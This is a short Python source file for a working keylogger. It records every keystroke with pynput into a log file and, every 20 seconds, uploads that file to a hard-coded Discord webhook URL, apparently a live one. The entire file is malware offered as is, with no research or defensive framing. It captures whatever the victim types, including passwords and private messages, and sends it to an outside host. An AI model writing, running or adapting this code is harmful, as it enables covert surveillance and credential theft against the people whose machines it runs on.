from pynput.keyboard import Key, Listener
import logging
from dhooks import Webhook, File
import schedule
import time
import os

log_send = Webhook('https://discord.com/api/webhooks/1159862596594323456/aF_df4_sBgZxL760mD9125AcTUfuqdfWu1d2MQIWzCOMx1JFWb75L3GtrxTyY1HDIgIk')

log_dir = "F:"
log_file_path = log_dir + "keylogs.txt"

logging.basicConfig(filename=(log_dir + "keylogs.txt"), \
	level=logging.DEBUG, format='%(asctime)s: %(message)s')

def enviar():
    try:
        with open(log_file_path, 'rb') as f:
            arxivo = File(f)
            log_send.send("Here is the file", file=arxivo)
            print("Archivo enviado.")
    except Exception as e:
        print(f"Error al enviar el archivo: {e}")

def on_press(key):
    logging.info(str(key))
    

with Listener(on_press=on_press) as listener:
    schedule.every(20).seconds.do(enviar)
    try:
        while True:
            schedule.run_pending()
            time.sleep(1)
    except KeyboardInterrupt:
        listener.stop()
        print("Programa detenido manualmente.")
